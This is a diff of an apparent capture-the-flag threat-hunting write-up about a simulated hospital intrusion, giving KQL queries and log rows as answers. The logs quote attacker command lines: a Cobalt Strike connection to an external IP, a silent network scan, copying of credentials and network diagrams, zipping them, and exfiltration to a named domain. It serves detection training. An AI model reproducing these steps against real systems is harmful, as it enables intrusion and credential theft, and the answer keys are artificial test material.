-|2024-05-14T12:24:45.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|C:\ProgramData\cobaltstrike.exe --connect 93.238.22.123:50050|cmd.exe|c167a329392a515e1cd2eead7f1481e2acbb02645f7dd036254450e66681cb7f|AMFB-MACHINE|andavis|
+|2024-05-14T12:24:45.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|C:\ProgramData\cobaltstrike.exe --connect 93.238.22.123:50050|cmd.exe|c167a329392a515e1cd2eead7f1481e2acbb02645f7dd036254450e66681cb7f|AMFB-MACHINE|andavis|  
 
 
-"Once they got on Anthony Davis' machine, the hackers wanted to get a better understanding of the entire hospital network. So they downloaded an advanced scanning tool."
+"Once they got on Anthony Davis' machine, the hackers wanted to get a better understanding of the entire hospital network. So they downloaded an advanced scanning tool."  
 
-**What was the name of this scanning tool?**
+
+**What was the name of this scanning tool?**  
+
 
 ```
 ProcessEvents
@@ -528,27 +649,33 @@ ProcessEvents
 | where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
 ```
 
+
 |timestamp|parent_process_name|parent_process_hash|process_commandline|process_name|process_hash|hostname|username|
 |---|---|---|---|---|---|---|---|
-|2024-05-16T10:00:05.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|C:\Users\andavis\Downloads\advanced-ip-scanner.exe /silent|advanced-ip-scanner.exe|1fe07fa09329574eb3d873c458a3625055d49b567e204992099430feee4b9086|AMFB-MACHINE|andavis|
+|2024-05-16T10:00:05.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|C:\Users\andavis\Downloads\advanced-ip-scanner.exe /silent|advanced-ip-scanner.exe|1fe07fa09329574eb3d873c458a3625055d49b567e204992099430feee4b9086|AMFB-MACHINE|andavis|  
 
 
-  **What was the name of the file the attackers exfiltrated to learn about the network? (hint: ___.pdf)**
+**What was the name of the file the attackers exfiltrated to learn about the network? (hint: ___.pdf)**  
+
 
 |process_commandline|
 |---|
-|cmd.exe /c copy C:\Users\andavis\Documents\network_diagrams.pdf \\jojos-hospital.org\backup\network_diagrams.pdf|
+|cmd.exe /c copy C:\Users\andavis\Documents\network_diagrams.pdf \\jojos-hospital.org\backup\network_diagrams.pdf|  
 
 
-  **What was the name of the file the attackers took that would have contained usernames and passwords?**
+**What was the name of the file the attackers took that would have contained usernames and passwords?**  
+
 
 | process_commandline                                                                                    |
 | ------------------------------------------------------------------------------------------------------ |
-| cmd.exe /c copy C:\Users\andavis\Documents\credentials.txt \\jojos-hospital.org\backup\credentials.txt |
+| cmd.exe /c copy C:\Users\andavis\Documents\credentials.txt \\jojos-hospital.org\backup\credentials.txt |  
 
-"Before stealing this file, the attackers first compressed them into a zip file. This allowed the files to be smaller so they would attract less attention."
 
-**What was the name of this zip file?**
+"Before stealing this file, the attackers first compressed them into a zip file. This allowed the files to be smaller so they would attract less attention."  
+
+
+**What was the name of this zip file?**  
+
 
 ```
 ProcessEvents
@@ -556,10 +683,15 @@ ProcessEvents
 | where process_commandline contains ".zip"
 ```
 
+
 |process_commandline|
 |---|
-|cmd.exe /c powershell Compress-Archive -Path C:\Users\andavis\Documents\network_diagrams.pdf, C:\Users\andavis\Documents\credentials.txt -DestinationPath C:\Users\andavis\Desktop\important_network_info.zip|
+|cmd.exe /c powershell Compress-Archive -Path C:\Users\andavis\Documents\network_diagrams.pdf, C:\Users\andavis\Documents\credentials.txt -DestinationPath C:\Users\andavis\Desktop\important_network_info.zip|  
 
-**Which domain did the attackers send the zip to?**
 
-`nothing-to-see-here.net`
+**Which domain did the attackers send the zip to?**  
+
+
+`nothing-to-see-here.net`  
+
+
